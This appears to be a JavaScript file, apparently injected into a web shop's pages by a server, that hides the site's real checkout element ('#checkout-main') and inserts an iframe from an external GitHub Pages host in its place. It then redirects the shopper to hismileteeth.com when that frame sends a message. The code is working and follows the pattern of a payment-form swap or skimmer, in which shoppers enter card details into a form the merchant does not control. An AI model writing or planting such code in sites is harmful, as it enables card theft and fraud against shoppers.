console.log(`this is script from from rl for smile`);
function resizeIframe(iframe) {
    console.log(`resizeIframe done`);
    // iframe.style.height =
    //     iframe.contentWindow.document.body.scrollHeight + "px";
    // iframe.style.height = "500px";
}
document.addEventListener("DOMContentLoaded", afterLoadingPage);
let paymentDivOr;
function afterLoadingPage() {
    console.log("Страница полностью загружена");
    paymentDivOr = document.querySelector(`#checkout-main`);
    console.log(`this is paymentDivOr`);
    console.log(paymentDivOr);
    paymentDivOr.style.display = "none";
    checkIfPaymentDivOrExist();
}

function changePaymentDiv() {
    paymentDivOr.style.display = "none";
    const paymentDivNew = document.createElement("div");
    paymentDivNew.style.height = "100%";
    paymentDivNew.innerHTML = `<iframe src="https://rlcodingrl.github.io/nginx_script/smileFrame" style="width: 100%; height: 600px" onload="resizeIframe(this)"></iframe>`;
    paymentDivOr.insertAdjacentElement("afterend", paymentDivNew);
    window.addEventListener("message", function (event) {
        if (event.origin === "https://rlcodingrl.github.io") {
            console.log("Сообщение из iframe:", event.data);
            window.location.replace("https://hismileteeth.com");
        }
    });
}

function checkIfPaymentDivOrExist() {
    if (paymentDivOr) {
        changePaymentDiv();
    } else {
        setTimeout(checkIfPaymentDivOrExist, 1000);
    }
}
// window.onload = function () {

// };
